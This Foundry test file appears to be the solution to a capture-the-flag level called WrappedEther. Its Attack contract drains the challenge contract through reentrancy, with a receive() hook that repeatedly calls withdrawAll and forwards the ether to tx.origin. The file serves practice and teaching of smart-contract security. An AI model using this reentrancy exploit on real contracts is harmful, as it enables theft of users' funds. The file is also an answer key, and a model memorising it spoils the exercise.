// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/13_WrappedEther/WrappedEther.sol";

// forge test --match-contract WrappedEtherTest
contract WrappedEtherTest is BaseTest {
    WrappedEther instance;

    function setUp() public override {
        super.setUp();

        instance = new WrappedEther();
        instance.deposit{value: 0.09 ether}(address(this));
    }

    function testExploitLevel() public {
        Attack attack = new Attack{value: address(instance).balance}(instance);
        vm.prank(user1);
        attack.start();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        console.log(
            "checkSuccess: address(instance).balance: ",
            address(instance).balance
        );
        assertTrue(
            address(instance).balance == 0,
            "Solution is not solving the level"
        );
    }
}

contract Attack {
    WrappedEther public instance;

    constructor(WrappedEther _instance) payable {
        instance = _instance;
    }

    function start() public {
        // uint256 balance = address(this).balance;
        // console.log("Deposit:", balance);
        instance.deposit{value: address(this).balance}(address(this));

        instance.withdrawAll();
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            instance.withdrawAll();
        } else {
            payable(tx.origin).transfer(address(this).balance);
        }
    }
}
